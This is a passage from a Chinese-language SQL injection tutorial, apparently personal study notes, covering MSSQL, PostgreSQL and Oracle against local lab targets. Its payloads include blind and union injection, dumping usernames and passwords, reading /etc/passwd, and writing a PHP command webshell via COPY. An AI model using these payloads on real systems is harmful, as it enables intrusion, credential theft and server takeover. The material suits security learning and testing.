<p>其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错</p>
<p>先来看隐式报错</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span></code></pre>
<p>user和0进行比较时就会报错</p>
<p>再来看显示报错，一般上显示报错用到的是<code>cast</code>和<code>convert</code>函数</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">CAST</span>(<span class="hljs-keyword">USER</span> <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>))
<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,<span class="hljs-keyword">user</span>))</code></pre>
<p>这里再来引入一个<code>declare</code></p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@a</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-string">'select convert(int,user)'</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@a</span>);</code></pre>
<p><code>declare</code>定义变量 <code>set</code>赋值<code>exec</code>执行</p>
<h2 id="27-联合查询注入">2.7 联合查询注入</h2>
<p>mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位，因为mssql数据库是个强类型的数据库，对数据格式比较严格。</p>
<p>（这里也是没搞懂发生隐式转换会如何，我猜测是转换后无法查询我们想让其查询的语句了）</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,DB_NAME();</code></pre>
<p>你也可以这样来联合报错</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">CAST</span>(db_name() <span class="hljs-keyword">as</span> <span class="hljs-type">int</span>))</code></pre>
<h2 id="28-布尔盲注">2.8 布尔盲注</h2>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> master.dbo.sysdatabases),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">109</span></code></pre>
<p>布尔盲注没有mysql那么多姿势，大同小异截取字符串比较</p>
<h2 id="29-时间盲注">2.9 时间盲注</h2>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;if (<span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">'sysadmin'</span>))<span class="hljs-operator">=</span><span class="hljs-number">1</span> WAITFOR DELAY <span class="hljs-string">'0:0:5'</span></code></pre>
<p><code>waitfor delay '0:0:5'</code>是mssql的延时语法</p>
<p>同样可以用字符串截取来延时注入</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;if (ascii(<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> master.dbo.sysdatabases),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> WAITFOR DELAY <span class="hljs-string">'0:0:5'</span></code></pre>
<h1 id="0x03-postgresql">0x03 PostgreSQL</h1>
<h2 id="31-环境搭建">3.1 环境搭建</h2>
<p>这里比较建议用docker搭建（如果不赶时间的话），我这里也是懒得搭建了，依旧是跟着文章走一遍</p>
<h2 id="32-验证注入">3.2 验证注入</h2>
<p>index.php?uid=1 AND 1=1 运行正常</p>
<p>index.php?uid=1 AND 1=2 运行异常</p>
<h2 id="33-报错注入">3.3 报错注入</h2>
<p>这里也没去查，猜测是cast函数将select查询出的数据转换为了as语句后面的numeric数字型，导致报错</p>
<p><strong>获取版本号：</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> tbuser <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">7778</span><span class="hljs-operator">=</span><span class="hljs-built_in">CAST</span>((<span class="hljs-keyword">SELECT</span> version())::text <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015100908578.png" alt="image-20231015100908578"></p>
<p><strong>获取 Schemas 名称</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> tbuser <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">7778</span><span class="hljs-operator">=</span><span class="hljs-built_in">CAST</span>((<span class="hljs-keyword">SELECT</span> schemaname <span class="hljs-keyword">FROM</span> pg_tables limit <span class="hljs-number">1</span>)::text <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015100921512.png" alt="image-20231015100921512"></p>
<h2 id="34-时间盲注">3.4 时间盲注</h2>
<pre><code class="hljs sql"><span class="hljs-keyword">AND</span> <span class="hljs-number">6489</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-number">6489</span> <span class="hljs-keyword">FROM</span> PG_SLEEP(<span class="hljs-number">5</span>)) <span class="hljs-operator">/</span><span class="hljs-operator">/</span>延时 <span class="hljs-number">5</span> 秒</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101251875.png" alt="image-20231015101251875"></p>
<h2 id="35-堆叠注入">3.5  堆叠注入</h2>
<p>（多语句查询，stacked queries）</p>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> PG_SLEEP(<span class="hljs-number">5</span>)<span class="hljs-comment">--</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101324281.png" alt="image-20231015101324281"></p>
<h2 id="36-联合注入">3.6 联合注入</h2>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> 运行正常

?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> 运行异常，获取字段数 <span class="hljs-number">3</span>

?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,(<span class="hljs-string">'11111'</span>),<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- 查看是否输出 11111</span></code></pre>
<p>这里依旧是NULL而不用数字占用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101436309.png" alt="image-20231015101436309"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101455053.png" alt="image-20231015101455053"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101502110.png" alt="image-20231015101502110"></p>
<p>获取数据库结构和内容，此处均为联合查询</p>
<h4 id="获取模式名称schemaname名称">获取模式名称（schemaname）名称</h4>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-built_in">COALESCE</span>(<span class="hljs-built_in">CAST</span>(schemaname <span class="hljs-keyword">AS</span> <span class="hljs-type">CHARACTER</span>(<span class="hljs-number">10000</span>)),(CHR(<span class="hljs-number">32</span>))),<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_tables<span class="hljs-comment">--</span></code></pre>
<p>语法解析：</p>
<pre><code class="hljs plaintext">COALESCE(expression[,n]) coalesce 函数返回参数（列名）中第一个非 NULL 值的字段值，注意不是为空''

cast ('1' as numeric) 1 转换为数字类型</code></pre>
<p>简化：</p>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,schemaname,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_tables<span class="hljs-comment">--</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101622775.png" alt="image-20231015101622775"></p>
<p>用户创建的数据库默认模式名称（schemaname）为 public</p>
<h3 id="获取数据表名称">获取数据表名称</h3>
<pre><code class="hljs sql">uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,tablename,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_tables <span class="hljs-keyword">WHERE</span> schemaname <span class="hljs-keyword">IN</span> (<span class="hljs-string">'public'</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101656967.png" alt="image-20231015101656967"></p>
<h3 id="获取表字段名称">获取表字段名称</h3>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,attname,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_namespace,pg_type,pg_attribute b <span class="hljs-keyword">JOIN</span> pg_class a <span class="hljs-keyword">ON</span> a.oid<span class="hljs-operator">=</span>b.attrelid <span class="hljs-keyword">WHERE</span> a.relnamespace<span class="hljs-operator">=</span>pg_namespace.oid <span class="hljs-keyword">AND</span> pg_type.oid<span class="hljs-operator">=</span>b.atttypid <span class="hljs-keyword">AND</span> attnum<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> a.relname<span class="hljs-operator">=</span><span class="hljs-string">'tbuser'</span> <span class="hljs-keyword">AND</span> nspname<span class="hljs-operator">=</span><span class="hljs-string">'public'</span>—</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101747879.png" alt="image-20231015101747879"></p>
<h3 id="获取表内容">获取表内容</h3>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,id<span class="hljs-operator">||</span><span class="hljs-string">','</span><span class="hljs-operator">||</span>username<span class="hljs-operator">||</span><span class="hljs-string">','</span><span class="hljs-operator">||</span>passwd,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> public.tbuser<span class="hljs-comment">--</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101838101.png" alt="image-20231015101838101"></p>
<p><strong>测列数：</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span>
<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span></code></pre>
<p><strong>测显位：第 2，3</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">'null'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> 错误
<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-string">'null'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> 正常
<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'null'</span>,<span class="hljs-keyword">null</span> 正常
<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'null'</span> 错误</code></pre>
<p><strong>获取信息：</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">null</span>,version(),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>
<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">null</span>,<span class="hljs-built_in">current_user</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>
<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,current_database(),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span></code></pre>
<p><strong>获取数据库名：</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(datname,<span class="hljs-string">','</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_database</code></pre>
<p><strong>获取表名：</strong></p>
<pre><code class="hljs sql"><span class="hljs-number">1</span>、<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(tablename,<span class="hljs-string">','</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_tables <span class="hljs-keyword">where</span> schemaname<span class="hljs-operator">=</span><span class="hljs-string">'public'</span>

<span class="hljs-number">2</span>、<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(relname,<span class="hljs-string">','</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_stat_user_tables</code></pre>
<p><strong>获取列名：</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(column_name,<span class="hljs-string">','</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">'reg_users'</span></code></pre>
<p><strong>获取数据：</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(username,<span class="hljs-string">','</span>)<span class="hljs-keyword">from</span> reg_users</code></pre>
<h2 id="37-文件或目录操作">3.7 文件或目录操作</h2>
<p>PostgreSQL 中部分内置函数、表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101911527.png" alt="image-20231015101911527"></p>
<h3 id="列目录只能列安装目录下的文件">列目录——只能列安装目录下的文件</h3>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,pg_ls_dir(<span class="hljs-string">'./'</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015101929944.png" alt="image-20231015101929944"></p>
<h3 id="读文件">读文件</h3>
<p>这里是堆叠注入，注意分号</p>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> passwd(t TEXT);<span class="hljs-keyword">COPY</span> passwd <span class="hljs-keyword">FROM</span> <span class="hljs-string">'/etc/passwd'</span>;<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,t,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> passwd;</code></pre>
<p>将要查询的数据放进了新建的t表，并最终读取</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015102053878.png" alt="image-20231015102053878"></p>
<h3 id="写文件">写文件</h3>
<pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> pass;（这里需要为数据库存在的表）<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hacktb (t TEXT);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hacktb(t) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'&lt;?php @system("$_GET[cmd]");?&gt;'</span>);<span class="hljs-keyword">COPY</span> hacktb(t) <span class="hljs-keyword">TO</span> <span class="hljs-string">'/tmp/hack.php'</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015102125008.png" alt="image-20231015102125008"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015102132894.png" alt="image-20231015102132894"></p>
<h1 id="0x04-oracle">0x04 Oracle</h1>
<h2 id="41-基本概念">4.1 基本概念</h2>
<p>Oracle和MySQL数据库语法大致相同，结构不太相同。<strong>最大的一个特点就是oracle可以调用Java代码。</strong></p>
<p>对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：</p>
<ol>
<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
<li>SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
<li>UNDOTBS：用于事务回退等</li>
<li>TEMP：作为缓存空间减少内存负担</li>
<li>USERS：就是存储我们定义的表和数据</li>
</ol>
<p>​		在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是<code>select 1+1 from dual</code>。</p>
<p>再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：</p>
<ol>
<li>sys：相当于 Linux 下的 root 用户。为 DBA 角色</li>
<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。</li>
<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
</ol>
<h2 id="42-基本语法">4.2 基本语法</h2>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">column</span>, group_function(<span class="hljs-keyword">column</span>)
<span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span>
[<span class="hljs-keyword">where</span> <span class="hljs-keyword">condition</span>]
[<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> group_by_expression]
[<span class="hljs-keyword">having</span> group_condition]
[<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">column</span>];</code></pre>
<p>Oracle要求select后必须指明要查询的表名，可以用dual。</p>
<p>Oracle使用 <code>||</code> 拼接字符串，MySQL中为或运算。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015104356973.png" alt="image-20231015104356973"></p>
<p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如<code>sysdate</code>。</p>
<p>Oracle中limit应该使用虚表中的rownum字段通过where条件判断。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015104406502.png" alt="image-20231015104406502"></p>
<p>Oracle中没有空字符，<code>''</code>和’null’都是null，而MySQL中认为<code>''</code>仍然是一个字符串。</p>
<p>Oracle对数据格式要求严格，比如<code>union select</code>的时候，放到下文讲。</p>
<p>Oracle的系统表：</p>
<pre><code class="hljs plaintext">- dba_tables : 系统里所有的表的信息，需要DBA权限才能查询
- all_tables : 当前用户有权限的表的信息
- user_tables: 当前用户名下的表的信息
- DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表
- ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表
- USER_ALL_TABLES：某一用户所拥有的对象和表</code></pre>
<p><strong>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</strong></p>
<h2 id="43-信息搜集">4.3 信息搜集</h2>
<p>从现在开始，我们以注入点<code>http://localhost:8080/oracleInject/index?username=admin</code>为例讲解。代码随便写一个jsp网页就行了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015104625343.png" alt="image-20231015104625343"></p>
<p>获取数据库版本信息</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,'</span>a<span class="hljs-string">',(SELECT banner FROM v$version WHERE banner LIKE '</span>Oracle<span class="hljs-operator">%</span><span class="hljs-number">25</span><span class="hljs-string">') from dual -- +</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015105016112.png" alt="image-20231015105016112"></p>
<p>获取操作系统版本信息</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,'</span>a<span class="hljs-string">',(SELECT banner FROM v$version where banner like '</span>TNS<span class="hljs-operator">%</span><span class="hljs-number">25</span><span class="hljs-string">') from dual -- +</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015105053990.png" alt="image-20231015105053990"></p>
<p>获取当前数据库</p>
<pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">' union select 1,'</span>a<span class="hljs-string">',(SELECT name FROM v$database) from dual -- +</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015105110814.png" alt="image-20231015105110814"></p>
<p>获取数据库用户</p>
